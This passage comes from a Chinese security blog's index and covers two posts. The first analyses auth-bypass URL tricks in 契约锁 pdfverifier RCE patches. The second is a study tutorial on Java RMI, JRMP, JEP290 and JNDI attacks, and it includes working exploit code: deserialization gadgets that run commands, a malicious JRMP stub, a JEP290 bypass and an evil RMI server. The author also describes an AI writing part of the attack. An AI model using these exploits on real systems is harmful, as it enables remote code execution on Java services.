filename*=&quot;%62%61%64%2e%6f%66%64&quot;PKxxx\n\nfilename后面有个*，这样才能进入springboot的url解码逻辑。\n1.3.3-1.3.5这里我们直接对比1.3.5和1.3.6，看看修复点在哪里：\n\n这里在URL处理时，移除了末尾的斜杠。而原本的逻辑，只是将&#x2F;&#x2F;替换成&#x2F;。\n我们看一下uriProcessor这个方法：\n\n首先能够发现，这个方法在各个Logic里面都会使用，用来从request里面解析url。解析URL是通过request.getRequestURI获取，所以这里能想到一些绕过，比如：\n\n&#x2F;api&#x2F;;&#x2F;pdfverifier\n&#x2F;api&#x2F;.&#x2F;pdfverifier\n&#x2F;&#x2F;&#x2F;api&#x2F;pdfverifier\n\n但是，在PdfLogic前，还有一个DangerUrlLogic，会对URL里的一些敏感字符进行拦截：\n\n不允许出现&#x2F;&#x2F;，.&#x2F;，;\n所以得想其他的方法去绕过。\n这里用到的就是Spring的路由解析特性，在最后加一个斜杠照样能访问到。\n所以绕过为：api&#x2F;pdfverifier&#x2F;\n这样就不会匹配PDFVERIFIER_URL_LIST：\n\n下面的截图是解密后的security.rsc\n\n1.3.6对比1.3.6和1.3.7，看看1.3.6的绕过点是怎么修的：\n\n1.3.6是将双斜杠换成单斜杠，1.3.7将任意多个斜杠，都替换成单斜杠。\n这里的绕过是三斜杠绕过，即在路由末尾添加三个斜杠。但是前面讲过，DangerUrlLogic应该会拦截双斜杠才对，三斜杠理应也被拦截，那么为什么这里又可以了呢？\n再看一下uriProcess方法：\n\n最后是先替换双斜杠为单斜杠，然后再去除末尾的斜杠。\n那么，&#x2F;&#x2F;&#x2F;最终就会变成&#x2F;，这样就跟1.3.5的绕过一样了。\n1.3.7和1.3.8补丁对比：\n\n可以发现，原本的zis.getNextEntry被修改成takeentrie.hasMoreElements()了。而takeentrie.hasMoreElements()和后面pdfverifierController那边的解压逻辑是一样的。那是不是可以说明，能够制作一个压缩包，能够使zis.getNextEntry为null，且在后面正常解压？\n我们跟进zis.getNextEntry，去看看怎么样才能返回null：\n\n重点在readLOC，跟进：\n\n这里其实是读取文件头等信息的方法，可以问一下AI，怎么样才能返回null：\n\n所以我们可以修改文件头：\n\n任意加两个字符即可，不会影响解压。\n总结这次新学的知识：\n1、热加载触发恶意类\n2、使用进程监视器观察热加载过程\n3、URL解析差异导致的鉴权绕过\n说实话，绕过里手法很多都是第一次见，以后得专门学一下URL解析差异导致的绕过\n另外，如果自己去挖掘新漏洞，应该如何下手？\n之前挖u8cloud时，是个spring mvc项目，几个入口路由都写在web.xml里了，难点在于搞清楚每个路由能调用哪些jar里的类，以及怎么去请求到具体的方法。\n而契约锁是个springboot项目，主要的jar只有几个，无需鉴权的url也写在config类里了。现在的问题是，怎么筛选出对应的类？另外，这里的鉴权和过滤，大部分都不是直接在controller中处理的，而是在各种filter中。那么，要怎么知道你的请求会被哪些filter处理？\n总之，大一点的springboot项目还有很多不熟悉的，尤其是在鉴权方面。之后有空得补一下开发相关的内容。\n参考契约锁pdfverifier RCE攻防绕过史 \n契约锁电子签章系统 pdfverifier rce 前台漏洞分析(从源码分析)-先知社区 \n契约锁代码审计分析_契约锁漏洞-CSDN博客 \n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"RMI JRMP JEP290 LDAP基础梳理","url":"/2025/11/10/RMI-JRMP-JEP290-LDAP%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86/","content":"前言网上有很多文章都讲过RMI，JRMP，JEP290 。但是每篇文章总有一些没涉及的，或是有一些讲得过分详细。这里我读了很多前辈的文章，并提取出相对简练的内容，帮助自己更好地了解JNDI的相关知识。\n这里的目标是：\n1、搞清楚RMI的通信流程，搞清楚Server，Registry，Client三者互相的打法\n2、了解JRMP在RMI中的作用，知道它和DGC的关系\n3、了解两次JEP290的防护和绕过，JEP290(8u121~8u230)，JEP290(8u231~8u240)\n4、了解JNDI的基本打法，包括codebase远程加载，ldap发送反序列化数据，reference本地工厂(BeanFactory为例)\n文章涉及到的代码：JavaGadget&#x2F;JNDI at main · 1diot9&#x2F;JavaGadget\n小提示：\n\n遇到下不了断点，调试不进去的情况，尝试换一下jdk版本\n\n20260203更新：补充了一些细节，主要关于JRMP利用；文末添加总结\nRMI通信流程RMI简介RMI是 Remote Method Invocation的缩写，java中远程方法调用，主要是为了让java中的方法和对象能被远程调用，跨JVM调用，其是基于JRMP协议的。类比于RPC远程过程调用，c语言里面C 程序员一直使用远程过程调用 (RPC) 在远程主机上执行 C 函数并返回结果。这里JRMP是结合java特性（面向对象）设置的”RPC”。\nRMI通信中，有三个部分：Registry，Server，Client。下面就围绕三者的通信展开。\nRegistry创建注册中心的创建很简单，只需要一行代码：\npublic static void main(String[] args) throws RemoteException &#123;    java.rmi.registry.Registry registry = LocateRegistry.createRegistry(1099);&#125;\n\n这样就能在1099端口开启一个Registry。\nServer绑定对象先在服务端创建远程对象\n接口：\npackage remoteObj;import java.rmi.Remote;import java.rmi.RemoteException;public interface Hello extends Remote &#123;    public String hello(String name) throws RemoteException;&#125;\n\n实现：\npackage remoteObj;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class HelloImpl extends UnicastRemoteObject implements Hello &#123;    public HelloImpl() throws RemoteException &#123;    &#125;    @Override    public String hello(String name) throws RemoteException &#123;        return &quot;hello &quot; + name;    &#125;&#125;\n\n接着将远程对象绑定到注册中心：\nimport remoteObj.HelloImpl;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Server &#123;    public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123;        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);        HelloImpl hello = new HelloImpl();        registry.bind(&quot;hello&quot;, hello);    &#125;&#125;\n\n网上有很多文章，会把注册中心创建和远程对象绑定放到同一段代码，因为这样才能保证Registry能持续开启。这里我将其分开，这样能更好地区别Registry和Server。\nbind在Server端进行bind操作时，会发生：\n1、Server发送一段序列化数据到Registry，这段序列化数据并不是远程对象本身，而是远程对象的一个stub(存根)。而存根里有一个字段，里面记录了ip+端口，而这个ip+端口，才是远程对象真正的位置，也就是位于Server端的远程对象，这个地址存放的对象，我们称作skel(骨根)。\n这两个词都很形象，Server端拥有远程对象本身，也就是拥有骨根；Registry只有远程对象的地址信息，只拥有存根。\n2、Registry收到序列化数据，进行反序列化来获得存根。得到存根后，Registry也会进行回复，而回复的对象也是序列化数据。\n3、Registry解析得到存根里的骨根地址，并向骨根，也就是Server，发送一次dgc dirty请求，这个请求也是以序列化的形式发送的。\n4、收到dgc dirty请求后，Server会回答一个lease对象给Registry，当然也是以序列化形式。\nbind过程流程图：\n\n这里来介绍一下DGC。\nDGCdgc全称distributed garbage-collection，是java中支撑远程方法调用设计的一套垃圾回收协议，Dgc里面就两个方法，一个叫clean 一个叫dirty。\n简单来说就是，当DGC中的客户端不需要存根的时候，就要调用clean方法，以便DGC的服务端可以回收相关垃圾。当DGC中的客户端持有某个存根或者需要持续的使用存根的时候，就要调用dirty方法，从而让DGC的服务端知道，客户端在使用，不能回收。除此之外使用dirty方法之后，会收到一个lease响应，这个lease里面会有一些时间的期限类的东西，超过期限还没有收到下一次的dirty请求，这个对象就会被回收。\n除此之外，这还有一个要点：\n传输内容的格式，传输对象的内容都是以序列化的形式出现在流量中。\n在上面的过程中，Server就是DGC服务端，Registry就是DGC客户端。\n反序列化小结总结一下Server端绑定远程对象时，哪里会触发反序列化。\n1、bind的时候，server端发送序列化数据给registry。正常情况下，registry反序列化得到stub。如果bind一个恶意对象，理论上能实现server打registry\n2、得到stub后，registry要回复server，也是序列化数据，所以这里理论上能registry打server\n3、registry解析stub后，获取skel地址，发送dgc dirty请求，也是序列化形式，这里理论上能registry打server\n4、server收到dgc dirty请求后，会返回一个lease对象，如果返回的是恶意对象，理论上能server打registry\n这里也能看出，server和registry能互相打，所以才会有“打别人，自己反被getshell”的说法。\nClient查找对象先开启注册中心：\nimport remoteObj.HelloImpl;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;public class Registry &#123;    public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123;        java.rmi.registry.Registry registry = LocateRegistry.createRegistry(1099);        registry.bind(&quot;hello&quot;, new HelloImpl());    &#125;&#125;\n\n接着使用Client调用：\nimport remoteObj.Hello;import java.rmi.NotBoundException;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Client &#123;    public static void main(String[] args) throws RemoteException, NotBoundException &#123;        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);        Hello hello = (Hello) registry.lookup(&quot;hello&quot;);        System.out.println(hello.hello(&quot;max&quot;));    &#125;&#125;\n\n需要注意的是，这里要求Client也存在Hello接口。\nlookup1、client发送序列化后的String对象\n2、registry反序列化得到String，根据String名称，找到相应的stub，序列化后返回给client\n3、client反序列化得到stub，解析得到skel，向server发送dgc dirty请求\n4、server收到dgc dirty请求，回复lease对象给client\n5、client将方法参数序列化，发送给server\n6、server执行远程方法，得到结果，序列化后发送给client\n7、client反序列化数据，得到方法执行结果\nlookup流程图：\n\n反序列化小结同样总结一下上面流程中的反序列化点。\n1、client lookup，发送String给registry来查找stub。这里虽然限制发送的对象为String，但是我们可以通过debug的方式，在调试过程中修改对象，然后让registry反序列化恶意对象。所以理论上能client打registry\n2、registry序列化stub后，发送给client，client会直接反序列化。所以这里构造恶意registry就能实现registry打client。这也是常用的一种绕过。java-chains里也有实现：\n\n3、client解析stub，获取skel地址后，会发送dgc dirty请求，这里理论上可以client打server\n4、server收到dgc dirty请求后，会返回lease对象，替换成恶意对象，理论上就能server打client\n5、client向远程方法中填入参数，序列化后发送给server。原本方法的参数类型是固定的，但是仍可以通过debug的方式动态修改。理论上能client打server。\n6、server执行远程方法调用后，将结果返回给client，这里返回恶意对象的话，就能server打client\nRMI攻击演示&amp;源码分析jdk8u65环境下演示。\npom.xml：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;com.test&lt;/groupId&gt;    &lt;artifactId&gt;JNDI&lt;/artifactId&gt;    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;    &lt;properties&gt;        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;    &lt;/properties&gt;   &lt;dependencies&gt;       &lt;dependency&gt;           &lt;groupId&gt;com.alibaba&lt;/groupId&gt;           &lt;artifactId&gt;fastjson&lt;/artifactId&gt;           &lt;version&gt;1.2.47&lt;/version&gt;       &lt;/dependency&gt;       &lt;dependency&gt;           &lt;groupId&gt;org.javassist&lt;/groupId&gt;           &lt;artifactId&gt;javassist&lt;/artifactId&gt;           &lt;version&gt;3.30.2-GA&lt;/version&gt;       &lt;/dependency&gt;   &lt;/dependencies&gt;&lt;/project&gt;\n\nbind利用这里演示怎么通过bind实现server打registry\n准备一个registry：\nimport remoteObj.HelloImpl;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;public class Registry &#123;    public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123;        java.rmi.registry.Registry registry = LocateRegistry.createRegistry(1099);        registry.bind(&quot;hello&quot;, new HelloImpl());    &#125;&#125;\n\nbind一个恶意对象：\nimport com.alibaba.fastjson.JSONArray;import remoteObj.HelloImpl;import tools.ClassByteGen;import tools.InvocationHandlerImpl;import tools.ReflectTools;import tools.TemplatesGen;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.lang.reflect.Proxy;import java.rmi.AlreadyBoundException;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Server &#123;    public static void main(String[] args) throws Exception &#123;        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);        HelloImpl hello = new HelloImpl();        Object payload = getPayload();        registry.bind(&quot;evil&quot;, (Remote) payload);    &#125;    // fastjson原生反序列化触发getter    public static Object getPayload() throws Exception &#123;        String code = &quot;&#123;\\n&quot; +                &quot;        Runtime.getRuntime().exec(\\&quot;calc\\&quot;);\\n&quot; +                &quot;    &#125;&quot;;        byte[] bytes = ClassByteGen.getBytes(code, &quot;AAAA&quot;);        Templates templates = TemplatesGen.getTemplates(bytes, null);        JSONArray jsonArray = new JSONArray();        jsonArray.add(templates);        BadAttributeValueExpException bad = new BadAttributeValueExpException(&quot;aaa&quot;);        ReflectTools.setFieldValue(bad, &quot;val&quot;, jsonArray);        InvocationHandlerImpl invocationHandler = new InvocationHandlerImpl(bad);        Object o = Proxy.newProxyInstance(invocationHandler.getClass().getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler);        return o;    &#125;&#125;\n\nClassByteGen：\npackage tools;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;public class ClassByteGen &#123;    public static byte[] getBytes(String code, String className) throws Exception &#123;//        String Abstract = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;        ClassPool pool = ClassPool.getDefault();//        pool.importPackage(Abstract);        pool.importPackage(&quot;java.io&quot;);        pool.importPackage(&quot;java.nio.file&quot;);        pool.importPackage(&quot;java.lang.reflect&quot;);        pool.importPackage(&quot;java.nio.charset&quot;);        pool.importPackage(&quot;java.util&quot;);//        pool.insertClassPath(Abstract);//        pool.insertClassPath(&quot;java.nio&quot;);        CtClass ctClass = pool.makeClass(className);//        ctClass.setSuperclass(pool.get(Abstract));        CtConstructor ctConstructor = ctClass.makeClassInitializer();        ctConstructor.setBody(code);//        CtConstructor ctConstructor1 = new CtConstructor(new CtClass[]&#123;&#125;, ctClass);//        ctConstructor1.setBody(code);//        ctClass.addConstructor(ctConstructor1);        ctClass.writeFile(&quot;ClassByteGen&quot;);        return ctClass.toBytecode();    &#125;&#125;\n\nInvocationHandlerImpl:\npackage tools;import java.io.Serializable;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;// 动态代理，实现对象接口转化public class InvocationHandlerImpl implements InvocationHandler, Serializable &#123;    private Object object;    public InvocationHandlerImpl(Object obj) &#123;        this.object = obj;    &#125;    @Override    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;        return null;    &#125;&#125;\n\n先启动registry，在运行server，成功利用。\n分析\n主要看bind。server端动态获得一个registry stub。38行与registry建立连接，传opnum和hash。\n41、42、43建立对象输出流，把远程对象的名称和对应的stub序列化。\n然后看registry端的，我们直接把断点打在readObject，因为肯定要反序列化，然后再看前面的调用栈：\n\n主要看skel#dispatch。之前的opnum和hash，分别对应这里的var3，var4 。所以这里进入case0\n\ncase0就是把server传输过来的远程对象名称和stub都反序列化，然后绑定到本地。而这里的反序列化没做任何过滤。\n同样，可以看到其他case里的rebind，lookup等方法也有直接readObject：\n\n所以理论上都存在反序列化漏洞。\n还有一个比较重要的地方，就是在bind前要套一层动态代理，转化成Remote接口实现。因为bind方法的第二个参数要求实现Remote接口：\n\n\nDGC传输恶意对象（JRMP攻击）根据上面的分析我们知道，registry获取到stub后，会向server skel发起dgc dirty请求，而server会返回lease对象。所以我们可以建一个符合JRMP协议的DGC server（DGC只要符合JRMP即可），当registry发起dirty请求时，返回恶意对象，从而实现server打registry。这其实就是JRMP攻击的一种。JRMP常常会与DGC机制联系。\n首先在server端构造一个恶意stub，里面的skel地址指向恶意JRMP Server：\nimport com.alibaba.fastjson.JSONArray;import remoteObj.HelloImpl;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import tools.ClassByteGen;import tools.InvocationHandlerImpl;import tools.ReflectTools;import tools.TemplatesGen;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.lang.reflect.Proxy;import java.rmi.AlreadyBoundException;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;public class Server &#123;    public static void main(String[] args) throws Exception &#123;        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);        HelloImpl hello = new HelloImpl();        Object o = makeJRMPAttack(&quot;127.0.0.1&quot;, 13999);        registry.bind(&quot;evil&quot;, (Remote) o);    &#125;    public static Object makeJRMPAttack(String host, int port) throws Exception &#123;        ObjID id = new ObjID(new Random().nextInt()); // RMI registry        TCPEndpoint te = new TCPEndpoint(host, port);        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);        Registry proxy = (Registry) Proxy.newProxyInstance(Server.class.getClassLoader(), new Class[] &#123;                Registry.class        &#125;, obj);        return proxy;    &#125;&#125;\n\n然后用java-chain起一个恶意JRMP服务：\n\n接着依次启动Registry，Server即可攻击成功。会弹好几次计算器，因为DGC请求是持续发送的。\n如果要自己写恶意JRMP服务的话，可以参考ysoserial源码中的ysoserial.exploit.JRMPListener\n这里有个问题，上面的makeJRMPAttack是怎么写出来的？我是直接搬运前辈的，稍微看了一下，发现自己不太能够从0写出。不过现在已经知道了需求，就是要单独指定Server中skel的地址，从而影响Register访问DGC的地址。我尝试询问AI：\nJava RMI中，Server和Register通信时，在Server bind 对象到Register时，怎么手动指定bind对象中的skel的地址和端口Server对象绑定在哪个端口无所谓，我主要需要指定skel中的地址和端口，从而达到影响Register访问的DGC服务地址\n\n然后AI给出了答案\nstatic class NatServerSocketFactory implements RMIServerSocketFactory, Serializable &#123;    private int localRealPort;    public NatServerSocketFactory(int localRealPort) &#123;        this.localRealPort = localRealPort;    &#125;    @Override    public ServerSocket createServerSocket(int port) throws IOException &#123;        // 【关键点】        // RMI 传入的 port 参数是我们在 exportObject 时指定的“公网端口”(9000)        // 但我们直接忽略它，强行绑定到“本地真实端口”(8000)        System.out.println(&quot;RMI asked to bind to &quot; + port + &quot;, but actually binding to &quot; + localRealPort);        return new ServerSocket(localRealPort);    &#125;&#125;// gemini3给出的方法public static void aiServerAttackRegistryWithJRMP() throws Exception &#123;    // 1. 设置公网 IP（Stub 中的 Host）    System.setProperty(&quot;java.rmi.server.hostname&quot;, &quot;127.0.0.1&quot;);    // 定义外部公网端口 (Stub 中的 Port，也是 Registry/DGC 尝试连接的端口)    int dgcPort = 13999;    // 定义内部真实端口 (Server 实际监听的端口)    int serverPort = 13990;    Hello hello = new HelloImpl2();    Remote stub = UnicastRemoteObject.exportObject(hello, dgcPort, null, new Server.NatServerSocketFactory(serverPort));    Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);    registry.bind(&quot;HelloImpl&quot;, stub);&#125;\n\n经过验证，是可行的。所以当我们理清了原理时，可以尝试让AI实现需求。\n同样，也可以registry打server。还是用java-chains创建恶意JRMP服务。然后server端填13999端口就行。\n    public static void main(String[] args) throws Exception &#123;        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 13999);        HelloImpl hello = new HelloImpl();//        Object o = makeJRMPAttack(&quot;127.0.0.1&quot;, 13999);        Object payload = getPayload();        registry.bind(&quot;evil&quot;, hello);    &#125;\n\n而且server执行bind，list，lookup，rebind，unbind都会触发。因为registry skel里都有releaseInputStream，即都会发送DGC请求给server：\n\n不管是registry还是server，都会收到DGC相关的序列化数据，所以都有反序列化的过程。因此JRMP都可以打。\nserver打client也是一样，java-chains起JRMP服务。client访问13999端口即可。client随便lookup一个对象即可，因为重要的是返回的stub里的skel的地址，这个地址跟lookup的对象无关，是恶意JRMP服务固定返回的。\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n更正一下，server打client不是直接访问13999端口就行。访问13999触发的原理在下面“jndi打client-JRMP”那里有讲。这里server打client的正确流程应该是：\n\n启动Registry\nServer绑定恶意stub到Registry\n启动恶意JRMP服务\nClient lookup Server绑定到Registry的恶意stub，从而解析里面的恶意DGC服务器地址，也就是恶意JRMP服务的地址，并与其通信，最后收到恶意lease反序列化触发rce\n\nserver打registry流程图：\n\n其他上面讲了如何通过bind实现server打registry；如何通过DGC实现registry打server，server打registry，server打client。其他还有在远程方法调用过程中，通过传参实现client打server，通过返回值实现server打client。不过都不太实用，就不细讲了，了解即可。\njdk高版本修复&amp;绕过bind打不了registry在大于jdk8u121时，无法通过bind实现server打registry。因为此时registry反序列化是白名单机制。\n下面是过滤后的结果：\n\n\n看一下registry的调用栈：\n\n\n最后的registryFilter，只允许String\\Number\\Remote\\Proxy\\UnicaseRef\\RMIClientSocketFactory\\RMIServerSocketFactory\\Actibation\\UID的类通过反序列化，这样一来，我们的gadget肯定用不了。\n这里的filter是在sun.rmi.server.UnicastServerRef#unmarshalCustomCallData设置的：\n\n这种通过黑白名单对bind的反序列化防护，其实就是JEP290.\n绕过JEP290（8u121~8u230）先简单讲一下JEP290是什么。\nJEP290 是 Java 底层为了解决反序列化攻击所提出的一种方案，主要有以下机制：\n提供一个限制反序列化类的机制，白名单或者黑名单\n限制反序列化的深度和复杂度\n为 RMI 远程调用对象提供了一个验证类的机制\n定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器\n设置JEP290有两种方法：\n1、通过setObjectInputFilter来设置filter\n2、直接通过conf&#x2F;security&#x2F;java.properties文件进行配置\n上面在bind时，进行了反序列化防护，但是在DGC通信中，没设置filter，而且DGC通信是有反序列化点的。所以可以通过发送恶意DGC数据的形式，进行攻击。这也就是JRMP打法，因为DGC通信满足JRMP协议。\n这个其实在RMI攻击演示&amp;源码分析那边讲过了，就是DGC传输恶意对象（JRMP攻击）。\n修复但是这种DGC传输恶意对象的方式，在8u231被修复过。\n看一下registry对server返回的恶意lease对象做了什么过滤，也就是普通DGC在8u230以后不能打的原因，这里是jdk8u341.\n\n这里也引入了白名单机制。所以打registry的方法应该都失效了。\n不过还是可以通过DGC打server和client，这两者在反序列化DGC请求时没有serialFilter。\n这个补丁就是常说的JEP290 。在 RMI 中 JEP290 主要是在远程引用层 之上进行过滤的，所以其过滤作用对 Server 和 Client 的互相攻击无效。这点很重要，因为CTF里很多题目往往就打Client。比如：ISCTF2025的Regretful_Deser  https://xz.aliyun.com/news/90777\n但是DGC打法在8u121~8u230之间是可以打的，主要看DGCImpl_Stub里有没有这行代码，这决定了DGC客户端，也就是Register在后面反序列化lease对象时，是否强制启用过滤：\n\n不过&gt;8u230还是有方法绕过\n绕过JEP290（8u231~8u240）文章末尾提到了如何绕过：https://xz.aliyun.com/news/8299\n\n这里针对的绕过是8u231~8u240\n不过链接里的文章失效了，可以看这篇：https://www.anquanke.com/post/id/259059#h3-11\n原理和修复文章都讲了，这里不赘述。（其实是没太看明白）\n最终的Server：\npackage RMI;import sun.rmi.registry.RegistryImpl_Stub;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import java.io.ObjectOutput;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Proxy;import java.rmi.Remote;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.*;import java.util.Random;// 绕过JEP290(8u231~8u240)public class ServerBypassJEP290 &#123;    public static void main(String[] args) throws Exception &#123;        UnicastRemoteObject payload = getPayload();        java.rmi.registry.Registry registry = LocateRegistry.getRegistry(1099);        bindReflection(&quot;pwn&quot;, payload, registry);    &#125;    static UnicastRemoteObject getPayload() throws Exception &#123;        ObjID id = new ObjID(new Random().nextInt());        TCPEndpoint te = new TCPEndpoint(&quot;localhost&quot;, 13999);        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));        System.getProperties().put(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;, &quot;true&quot;);        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref);        RMIServerSocketFactory factory = (RMIServerSocketFactory) Proxy.newProxyInstance(                handler.getClass().getClassLoader(),                new Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,                handler        );        Constructor&lt;UnicastRemoteObject&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor();        constructor.setAccessible(true);        UnicastRemoteObject unicastRemoteObject = constructor.newInstance();        Field field_ssf = UnicastRemoteObject.class.getDeclaredField(&quot;ssf&quot;);        field_ssf.setAccessible(true);        field_ssf.set(unicastRemoteObject, factory);        return unicastRemoteObject;    &#125;    static void bindReflection(String name, Object obj, Registry registry) throws Exception &#123;        Field ref_filed = RemoteObject.class.getDeclaredField(&quot;ref&quot;);        ref_filed.setAccessible(true);        UnicastRef ref = (UnicastRef) ref_filed.get(registry);        Field operations_filed = RegistryImpl_Stub.class.getDeclaredField(&quot;operations&quot;);        operations_filed.setAccessible(true);        Operation[] operations = (Operation[]) operations_filed.get(registry);        RemoteCall remoteCall = ref.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L);        ObjectOutput outputStream = remoteCall.getOutputStream();        Field enableReplace_filed = ObjectOutputStream.class.getDeclaredField(&quot;enableReplace&quot;);        enableReplace_filed.setAccessible(true);        enableReplace_filed.setBoolean(outputStream, false);        outputStream.writeObject(name);        outputStream.writeObject(obj);        ref.invoke(remoteCall);        ref.done(remoteCall);    &#125;&#125;\n\n远程codebase失效这个是jndi里的修复。&gt;8u121, &gt;8u191时，rmi和ldap分别无法从远程地址加载恶意工厂类。这个是老生常谈了，就不展开说。\njndi打client在实际中，我们往往是发现一个可控的InitialContext.lookup点，也就是client的lookup可控。这个时候，就需要我们想办法去打client，下面就梳理一下打法。\nJRMPRegistry返回恶意报错对象\n在123行，ref.invoke(call)。一开始误认为是在127行，实际上127行是Registry返回恶意stub，反序列化stub导致的rce。\n跟进后来到：\n\n然后跟进executeCall：\n\n最终是在这里触发。上面的case代表出现了报错，也就是恶意Registry通过返回恶意的报错从而攻击Client。\n这里有个规律，只要一个接口被RemoteObjectInvocationHandler（里面的ref，一般是UnicastRef指向恶意jrmp）动态代理了，那么这个对象执行任意方法时，都会走RemoteObjectInvocationHandler#invoke，最终走到UnicastRef#invoke–&gt;StreamRemoteCall#executeCall，然后就可以反序列化恶意报错对象。\n被RemoteObjectInvocationHandler代理的接口有个条件，必须实现Remote接口，理由如图：\ninvoke会走到这里，代理如果没实现Remote接口，就会报错。\nJRMP Listener实现：\nhttps://github.com/1diot9/MyJavaSecStudy/blob/main/JNDI/JNDI/src/main/java/JRMP/JRMPListener.java\nRMIRegistry返回恶意stubregistry返回的stub会直接被client反序列化，所以可以构造恶意stub来实现攻击。\n我们知道，在高版本jdk中，如jdk17.0.16，默认不允许ldap反序列化数据：\n\n但是对registry返回的stub却仍然直接调用readObject：\n\n所以可以通过RMI进行原生反序列化，这是一种在高版本jdk常用的绕过。\n恶意RMI，即恶意Registry可以通过java-chains起：\n\n那如果想用自己的链子，就要自己实现Registry。N1CTF2025的n1cat给出了实现：\nimport java.io.BufferedInputStream;import java.io.BufferedOutputStream;import java.io.DataInputStream;import java.io.DataOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.ObjectStreamClass;import java.io.OutputStream;import java.net.InetSocketAddress;import java.net.ServerSocket;import java.net.Socket;import java.net.SocketException;import java.net.URL;import java.net.URLClassLoader;import java.rmi.MarshalException;import java.rmi.server.ObjID;import java.rmi.server.UID;import javax.net.ServerSocketFactory;import org.slf4j.Logger;import org.slf4j.LoggerFactory;public class evilServer implements Runnable &#123;    public static void main(String[] args) &#123;        //before you start it, you should set vm options:&quot;--add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED&quot;        evilServer.start();    &#125;    private static final Logger log = LoggerFactory.getLogger(evilServer.class);    public String ip;    public int port;    private ServerSocket ss;    private final Object waitLock = new Object();    private boolean exit;    private boolean hadConnection;    private static evilServer serverInstance;    public evilServer(String ip, int port) &#123;        try &#123;            this.ip = ip;            this.port = port;            this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    public static synchronized void start() &#123;        serverInstance = new evilServer(&quot;0.0.0.0&quot;, 8899);        Thread serverThread = new Thread(serverInstance);        serverThread.start();        log.warn(&quot;[RMI Server] is already running.&quot;);    &#125;    public static synchronized void stop() &#123;        if (serverInstance != null) &#123;            serverInstance.exit = true;            try &#123;                serverInstance.ss.close();            &#125; catch (IOException e) &#123;                